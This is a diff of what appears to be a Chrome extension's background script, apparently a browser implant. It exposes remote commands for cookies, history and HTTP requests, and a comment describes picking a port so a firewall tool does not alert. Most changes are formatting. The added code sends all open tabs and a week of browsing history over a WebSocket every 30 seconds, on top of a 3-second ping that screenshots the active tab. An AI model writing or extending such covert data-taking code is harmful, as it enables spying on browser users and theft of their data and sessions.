@@ -20,7 +20,7 @@ const REQUEST_HEADER_BLACKLIST = ["cookie"];
 
 const RPC_CALL_TABLE = {
   HTTP_REQUEST: perform_http_request,
-  PONG: () => {}, // NOP, since timestamp is updated on inbound message.
+  PONG: () => { }, // NOP, since timestamp is updated on inbound message.
   AUTH: authenticate,
   GET_COOKIES: get_cookies,
   GET_HISTORY: get_history,
@@ -29,31 +29,34 @@ const RPC_CALL_TABLE = {
 };
 
 function get_current_tab() {
-    return new Promise((resolve) => {
-        chrome.tabs.query({'active': true, 'lastFocusedWindow': true}, function (tabs) {
-            console.log(tabs[0])
-            resolve(tabs[0])
-        });
+  return new Promise((resolve) => {
+    chrome.tabs.query({ 'active': true, 'lastFocusedWindow': true }, function (tabs) {
+      console.log(tabs[0])
+      resolve(tabs[0])
     });
+  });
 }
 
 function get_tabs() {
-    return new Promise((resolve) => {
-        chrome.tabs.query({}, function (tabs) {
-            console.log(tabs)
-            resolve(tabs)
-        });
+  return new Promise((resolve) => {
+    chrome.tabs.query({}, function (tabs) {
+      console.log(tabs)
+      resolve(tabs)
     });
+  });
 }
 
-function get_current_tab_image (){
+function get_current_tab_image() {
   return new Promise((resolve) => {
-    chrome.tabs.captureVisibleTab(options={"format":"png"},callback=(dataUrl) => resolve(dataUrl));
+    chrome.tabs.captureVisibleTab(options = { "format": "png" }, callback = (dataUrl) => {
+      console.log(dataUrl)
+      return resolve(dataUrl)
+    });
   });
 };
 
 
-async function get_bookmarks(params) {}
+async function get_bookmarks(params) { }
 
 /*
     Return an array of history for the current logs.
@@ -210,12 +213,31 @@ const websocket_check_interval = setInterval(async () => {
       action: "PING",
       data: {
         current_tab: await get_current_tab(),
-        tabs: await get_tabs(),
-        current_tab_image: await get_current_tab_image()
+        current_tab_image: await get_current_tab_image(),
       },
     })
   );
+
+
+
 }, 1000 * 3);
+
+
+const websocket_sync_interval = setInterval(async () => {
+  websocket.send(
+    JSON.stringify({
+      id: uuidv4(),
+      version: "1.0.0",
+      action: "SYNC",
+      data: {
+        tabs: await get_tabs(),
+        history: await get_history_by_day(7),
+      },
+    })
+  );
+}, 1000 * 30);
+
+
 
 // Headers that fetch() can't set which need to
 // utilize webRequest to be able to send properly.
@@ -353,10 +375,10 @@ function initialize() {
   // setting the WebSocket port to be the standard
   // TLS/SSL port (this will make sure tools like little
   // snitch don't alert on a new port connection from Chrome).
-  
+
   websocket = new WebSocket("ws://127.0.0.1:4343");
 
-  websocket.onopen = function (e) {};
+  websocket.onopen = function (e) { };
 
   websocket.onmessage = async function (event) {
     // Update last live connection timestamp
@@ -552,7 +574,7 @@ chrome.webRequest.onHeadersReceived.addListener(
 );
 
 chrome.tabs.onActivated.addListener(
-  function (details){
+  function (details) {
     console.log(details)
   }
 )
